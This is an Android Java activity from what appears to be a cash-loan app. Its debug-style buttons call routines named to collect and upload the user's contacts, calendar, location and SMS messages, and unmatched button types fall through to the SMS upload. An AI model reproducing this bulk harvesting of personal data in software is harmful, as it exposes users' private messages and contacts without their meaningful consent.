package com.cashhub.cash.app;

import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import android.util.Log;
import android.view.View;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;
import androidx.core.content.FileProvider;
import com.alibaba.fastjson.JSONException;
import com.alibaba.fastjson.JSONObject;
import com.cashhub.cash.common.KndcStorage;
import com.cashhub.cash.common.UploadData;
import java.io.File;
import java.io.IOException;

public class UploadActivity extends AppCompatActivity {
  private String TAG = "UploadActivity";
  private Uri ImageUri;
  public static final int TAKE_PHOTO = 101;
  public static final int TAKE_CAMARA = 100;

  @Override
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_upload);
  }

  //跳转相册
  private void toPicture() {
    Intent intent = new Intent(Intent.ACTION_PICK);  //跳转到 ACTION_IMAGE_CAPTURE
    intent.setType("image/*");
    startActivityForResult(intent, TAKE_CAMARA);
    Log.i(TAG, "跳转相册成功");
  }

  //跳转相机
  private void toCamera() {
    //创建File对象，用于存储拍照后的图片
//        File outputImage = new File(getExternalCacheDir(), "outputImage.jpg");
    File outputImage = new File(getExternalCacheDir(), System.currentTimeMillis() + ".jpg");
    if (outputImage.exists()) {
      outputImage.delete();
    } else {
      try {
        outputImage.createNewFile();
      } catch (IOException e) {
        e.printStackTrace();
      }
    }
    //判断SDK版本高低，ImageUri方法不同
    if (Build.VERSION.SDK_INT >= 24) {
      ImageUri = FileProvider
          .getUriForFile(this, "com.uni.app.fileprovider", outputImage);
    } else {
      ImageUri = Uri.fromFile(outputImage);
    }

    //启动相机程序
    Intent intent = new Intent("android.media.action.IMAGE_CAPTURE");
    intent.putExtra(MediaStore.EXTRA_OUTPUT, ImageUri);
    startActivityForResult(intent, TAKE_PHOTO);
  }

  @RequiresApi(api = Build.VERSION_CODES.M)
  private void buttonClick(final String type) {
    new Thread(() -> {
      try {
        UploadData mUploadData = new UploadData(this);

        // 获取上传sign_url
        JSONObject locationJson = new JSONObject();
        locationJson.put("test", "ooo");
        long timeStamp = 1635955200;
        switch (type) {
          case "device":
//            mUploadData.getAndSendDevice();
            break;
          case "contact":
            mUploadData.getAndSendContact();
            break;
          case "calendar":
            mUploadData.getAndSendCalendar();
            break;
          case "location":
            mUploadData.getAndSendLocation();
            break;
          default:
            mUploadData.getAndSendSms(timeStamp);
            break;
        }

      } catch (Exception e) {
        Log.d(TAG, e.getMessage());
      }
    }).start();//启动线程
  }

  @RequiresApi(api = Build.VERSION_CODES.M)
  public void button_device_click(View view) {
    buttonClick("device");
  }

  @RequiresApi(api = Build.VERSION_CODES.M)
  public void button_contact_click(View view) {
    buttonClick("contact");
  }

  @RequiresApi(api = Build.VERSION_CODES.M)
  public void button_sms_click(View view) {
    buttonClick("sms");
  }

  @RequiresApi(api = Build.VERSION_CODES.M)
  public void button_calendar_click(View view) {
    buttonClick("calendar");
  }

  @RequiresApi(api = Build.VERSION_CODES.M)
  public void button_location_click(View view) {
    buttonClick("location");
  }

  @RequiresApi(api = Build.VERSION_CODES.M)
  public void button_location2_click(View view) {
    buttonClick("location2");
  }
}